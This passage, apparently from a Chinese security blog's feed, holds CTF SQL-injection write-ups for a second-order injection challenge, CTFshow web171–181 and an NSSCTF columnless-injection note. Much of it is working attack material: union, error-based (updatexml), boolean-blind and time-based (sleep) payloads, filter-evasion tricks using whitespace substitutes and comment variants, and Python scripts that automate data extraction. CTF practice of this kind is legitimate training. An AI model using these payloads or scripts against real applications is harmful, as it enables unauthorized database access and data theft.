class="line">SQL二次注入的实现，在第一步要求我们插入的恶意数据能够成功写入到目标站点的数据库中，站点可以对我们写入的恶意数据进行转义，但是数据本身不会被修改，也不会因为恶意的数据而拒绝我们的写入；第二步要求我们的恶意数据能够在某种应用场景下取出，并且不会对其站点内部的数据进行检验</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所以也就是满足这两个条件即可</span><br><span class="line"></span><br><span class="line">用户向数据库插入恶意数据，即使后端对语句做了转义，如mysql_escape_string、mysql_real_escape_string等函数</span><br><span class="line"></span><br><span class="line">数据库能够将恶意数据取出</span><br></pre></td></tr></table></figure><p>这里情况相符</p><p>现在注册页面构造恶意的payload</p><p>fuzz发现uesrname这”没过滤</p><p>在注册账号这里username 这写入Gu0f3n”</p><p>修改密码这发现报错</p><p>猜测语句为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>&quot;Gu0f3n&quot; &quot; and password=&#x27; 5134f78f6e827c2a7e8767020cf23cbf&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>双引号闭合有报错</p><p>尝试报错注入</p><p>||用来拼接 发现空格 &#x2F;**&#x2F;同时被过滤了括号绕过空格</p><p>直接查表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘:article,flag,users’</p><p>查列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘:flag’</p><p>flag在user表里</p><p>这里有个坑</p><p>因为限制长度所以列名没有显示清楚regexp(‘’^r’)</p><p>用来把想要的列名筛选出来and被过滤了用&amp;&amp;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1))#</span><br><span class="line">#XPATH syntax error: &#x27;real_flag_1s_here&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘:name,pwd,email,real_flag_1s_here’</p><p><code>regexp</code> 是一个正则表达式匹配操作符，通常用于检查某个字符串是否符合指定的正则表达式模式。</p><p>整个 <code>regexp(&#39;^f&#39;)</code> 的作用是筛选出 <strong>以字母 <code>f</code> 开头的值</strong>。<code>^</code>：表示匹配字符串的开始</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘~flag{24b07aef-f8cc-4348-a482-12’</p><p>过滤了substr mid 等函数 用reverse函数</p><p>反转即可<a href="https://tool.box3.cn/reverse.html">https://tool.box3.cn/reverse.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘~}c4d832e9db21-284a-8434-cc8f-fe’</p><p>反转拼接即可</p><p>flag{24b07aef-f8cc-4348-a482-12bd9e238d4c}</p><p>重开靶机用脚本试试</p><p>脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_reg = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//register.php&#x27;</span></span><br><span class="line">url_log = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//login.php&#x27;</span></span><br><span class="line">url_change = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//changepwd.php&#x27;</span></span><br><span class="line"></span><br><span class="line">pre = <span class="string">&#x27;Gu0f3n&quot;&#x27;</span></span><br><span class="line"><span class="comment"># 逆序闭合</span></span><br><span class="line">suf = <span class="string">&quot;&#x27;)))),1))#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正序闭合</span></span><br><span class="line"><span class="comment"># suf = &quot;&#x27;))),1))#&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27;</span></span><br><span class="line">s = <span class="built_in">list</span>(s)</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url=url_reg, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">name</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url=url_log, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changepwd</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;oldpass&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;newpass&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    kk = r.post(url=url_change, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XPATH&#x27;</span> <span class="keyword">in</span> kk.text:</span><br><span class="line">        <span class="built_in">print</span>(kk.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># 正序</span></span><br><span class="line">    <span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + suf</span></span><br><span class="line">    <span class="comment"># 逆序</span></span><br><span class="line">    paylaod = pre + <span class="string">&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot;</span> + i + suf</span><br><span class="line">    register(paylaod)</span><br><span class="line">    login(paylaod)</span><br><span class="line">    changepwd()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正序payload</span></span><br><span class="line"><span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + &quot;&#x27;))),1))#&quot;</span></span><br><span class="line"><span class="comment"># 逆序payload</span></span><br><span class="line"><span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + &quot;&#x27;)))),1))#&quot;</span></span><br></pre></td></tr></table></figure><p>先正序在逆序</p><p>之后拼接一下就可以出</p><p>flag{95001f84-9ad6-499b-9a06-9c0d2e6b8d4c}</p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>二次注入 </p><p>简介这有回显</p><p>原理一样，注册页面没有过滤 直接盲猜表和列为flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select flag from flag#</span><br></pre></td></tr></table></figure><p>flag{77a8ffbc-ad0e-4968-be7e-4c81898910a6}</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><strong>注入点在password</strong> </p><p>替换为空的是select union or </p><p>正常注入即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;RCTF2015-EasySQL&quot;&gt;&lt;a href=&quot;#RCTF2015-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[RCTF2015]EasySQL&quot;&gt;&lt;/a&gt;[RCTF2015]EasySQL&lt;/h2&gt;&lt;p&gt;一个登录页面，应该要先注</summary>
      
    
    
    
    <category term="sql刷题笔记" scheme="https://gu0f3n.github.io/categories/sql%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SQL" scheme="https://gu0f3n.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow</title>
    <link href="https://gu0f3n.github.io/2024/08/08/CTFSHOW/"/>
    <id>https://gu0f3n.github.io/2024/08/08/CTFSHOW/</id>
    <published>2024-08-08T07:11:44.000Z</published>
    <updated>2024-08-08T13:17:44.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>查询语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>给了源码</p><p>闭合单引号 而且字段可以直接看出三列</p><p>爆库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure><p>ctfshow_web</p><p>分析下给的源码</p><ol><li><strong>选择字段</strong><ul><li><code>select username, password</code>: 选择<code>user</code>表中的<code>username</code>和<code>password</code>列。</li></ul></li><li><strong>指定表</strong><ul><li><code>from user</code>: 指定查询的数据表为<code>user</code>。</li></ul></li><li><strong>条件</strong><ul><li><code>where username !=&#39;flag&#39;</code>: 条件是<code>username</code>不等于<code>&#39;flag&#39;</code>。这确保查询结果中不包含用户名为<code>flag</code>的记录。</li><li><code>and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;</code>: 条件是<code>id</code>等于从URL参数<code>id</code>获取的值。</li></ul></li><li><strong>限制结果</strong><ul><li><code>limit 1</code>: 限制查询结果最多返回一条记录。</li></ul></li></ol><p>参数可控可以猜测用户名为flag的用户就是我们的答案</p><p>万能密码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><p>也可以or截断</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or username = &#x27;flag</span><br></pre></td></tr></table></figure><p>ctfshow{1ae89b71-537e-4704-9493-f90aa665f1c0}</p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>查看源码</p><p>看到select.js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">layui.<span class="title function_">use</span>(<span class="string">&#x27;form&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> form = layui.<span class="property">form</span>;</span><br><span class="line">  form.<span class="title function_">on</span>(<span class="string">&#x27;submit(*)&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> id = data.<span class="property">field</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> table = layui.<span class="property">table</span>;</span><br><span class="line">    table.<span class="title function_">reload</span>(<span class="string">&#x27;user_table&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&#x27;api/?id=&#x27;</span> + id</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 阻止表单默认提交行为</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>**<code>form.on(&#39;submit(\*)&#39;, function(data)&#123; ... &#125;)</code>**：监听表单提交事件，获取表单字段中的<code>id</code>值，并重新加载表格数据。</li></ul><p>注入点为id字段 单引号闭合</p><p>尝试上一关的payload</p><p>{“id”:”26”,”username”:”flag”,”password”:”flag_not_here”}]}</p><p>发现不在这</p><p>老实注</p><p>字段为3位</p><p>爆库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure><p>{“id”:”1”,”username”:”ctfshow_web”,”password”:”3”}]}</p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p>{“id”:”1”,”username”:”ctfshow_user,ctfshow_user2”,”password”:”3”}]}</p><p>password表没东西</p><p>ctfshow_user,ctfshow_user2的列一样</p><p>id,username,password</p><p>爆值</p><p>在第二张表里</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(id,username,password),3 from ctfshow_user2--+</span><br></pre></td></tr></table></figure><p>ctfshow{b7520f1e-a489-493c-aabb-e1e978bae8cc}</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>依旧是在api这个接口</p><p>多了一张表3其余和上一关一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(id,username,password),3 from ctfshow_user3--+</span><br></pre></td></tr></table></figure><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>这里在api路由这里没回显</p><p>直接看无过滤注入4模块</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有过滤的字符型注入，更改正则表达式 <code>/flag|[0-9]/i</code>，返回结果中不能有数字</p><p>考虑盲注</p><p>抓包接口是api&#x2F;v4.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23</span><br></pre></td></tr></table></figure><p>这里稍稍解释下吧</p><p>编写盲注脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取常量</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://d0a608fb-8c33-4e69-abbc-5429035225b4.challenge.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line">ASCII_START = <span class="number">32</span></span><br><span class="line">ASCII_END = <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    response = requests.get(URL + PAYLOAD_TEMPLATE.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lbw&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;xyz&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unexpected response content&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        start, end = ASCII_START, ASCII_END</span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            point = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">                start = point + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = point</span><br><span class="line">        flag += <span class="built_in">chr</span>(end)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 假设我们知道flag的结束字符，这里可以设置退出条件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">50</span>:  <span class="comment"># 这个条件可以根据实际情况调整</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = find_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;fe9a4453-ad08-4e6f-a83c-bcc2aa982a77&#125;</span></span><br></pre></td></tr></table></figure><p>ctfshow{fe9a4453-ad08-4e6f-a83c-bcc2aa982a77}</p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>也就是说什么都不会返回</p><p>考虑时间盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(2) %23</span><br></pre></td></tr></table></figure><p>可行</p><p>上一关步骤一样</p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常量</span></span><br><span class="line">CHAR_SET = <span class="string">&#x27;1234567890-_&#123;&#125;qwertyuiopasdfghjklzxcvbnm&#x27;</span>  <span class="comment"># 字符集</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://80f58198-ee06-4a46-a2cc-3f2aea94e556.challenge.ctf.show/api/v5.php?id=&#123;&#125;&amp;page=1&amp;limit=1&#x27;</span></span><br><span class="line">DELAY_THRESHOLD = <span class="number">2</span>  <span class="comment"># 延迟时间（秒）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_correct_char</span>(<span class="params">position: <span class="built_in">int</span>, char: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断指定字符是否在特定位置&quot;&quot;&quot;</span></span><br><span class="line">    sql_payload = <span class="string">&quot;1&#x27; and if(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(&#123;&#125;),0) %23&quot;</span>.<span class="built_in">format</span>(position, char, DELAY_THRESHOLD)</span><br><span class="line">    url = BASE_URL.<span class="built_in">format</span>(sql_payload)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    requests.get(url)</span><br><span class="line">    elapsed_time = time.time() - start_time</span><br><span class="line">    <span class="keyword">return</span> elapsed_time &gt;= DELAY_THRESHOLD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">max_length: <span class="built_in">int</span> = <span class="number">64</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;逐字符地提取 flag&quot;&quot;&quot;</span></span><br><span class="line">    extracted_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> CHAR_SET:</span><br><span class="line">            <span class="keyword">if</span> is_correct_char(pos, char):</span><br><span class="line">                extracted_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Extracted flag so far: <span class="subst">&#123;extracted_flag&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> extracted_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = extract_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final extracted flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;7b9f5582-39db-4e99-bed6-9da1772ed2ba&#125;</span></span><br></pre></td></tr></table></figure><p>ctfshow{7b9f5582-39db-4e99-bed6-9da1772ed2ba}</p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>过滤了union select </p><p>大小写绕过</p><p>万能密码可以直接绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; Union Select 1,password,3 from ctfshow_user --+</span><br></pre></td></tr></table></figure><p>ctfshow{939338e1-d47c-461b-bc76-f4e60435ae80}</p><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><p>过滤空格 而且 –+，#应该也过滤了</p><p>&#x2F;**&#x2F; %23</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,group_concat(password),3/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>依旧可行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><p>增加了<code>/**/</code>的过滤</p><p>可以这些绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回车(%0a) `(tab键上面的按钮)(%09) tab 和  %0b %0c %0d %a0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%0aunion%0aselect%0a1,password,3%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,password,3%09from%09ctfshow_user%23</span><br></pre></td></tr></table></figure><p>ctfshow{a2e33152-7f53-4000-b89b-972b5fc739a2}</p><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0c可以用</span><br><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>还是过滤空格 只不过这次加了对 <code>#</code>(<code>%23</code>) 的过滤</p><p>万能密码依旧能打</p><p>只不过需要</p><p>这里使用 <code>--</code>(–后加个空格) 绕过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user--%0c</span><br></pre></td></tr></table></figure><p>ctfshow{94f1ba08-b230-4dda-9a6a-eeaac94caef2}</p><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>继续造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web171&quot;&gt;&lt;a href=&quot;#web171&quot; class=&quot;headerlink&quot; title=&quot;web171&quot;&gt;&lt;/a&gt;web171&lt;/h2&gt;&lt;p&gt;查询语句&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    <category term="sql刷题笔记" scheme="https://gu0f3n.github.io/categories/sql%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SQL" scheme="https://gu0f3n.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF</title>
    <link href="https://gu0f3n.github.io/2024/08/06/NSSCTF-sql/"/>
    <id>https://gu0f3n.github.io/2024/08/06/NSSCTF-sql/</id>
    <published>2024-08-06T11:51:49.000Z</published>
    <updated>2024-08-07T13:03:57.329Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK2-easy-sql"><a href="#HNCTF-2022-WEEK2-easy-sql" class="headerlink" title="[HNCTF 2022 WEEK2]easy_sql"></a>[HNCTF 2022 WEEK2]easy_sql</h1><p>参考文章：<a href="https://blog.csdn.net/Jayjay___/article/details/132956781">https://blog.csdn.net/Jayjay___/article/details/132956781</a></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这题考察了无列名注入</p><p>我们常用的<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>方法是通过<code>information_schema</code>这个默认数据库来实现，可是你有没有想过，如果过滤了该数据库那么我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名：</p><p><strong>InnoDb引擎</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表（mysql.innodb_table_stats），这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</span><br></pre></td></tr></table></figure><p><strong>sys数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns（sys.schema_auto_increment_columns）来获取表名。</span><br></pre></td></tr></table></figure><p>但是上述两种方法都只能查出表名，<strong>无法查到列名</strong>，这时我们就要用到无列名注入了。无列名注入，顾名思义，就是不需要列名就能注出数据的注入。</p><p><strong>无列名注入使用条件</strong></p><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，<strong>information_schema 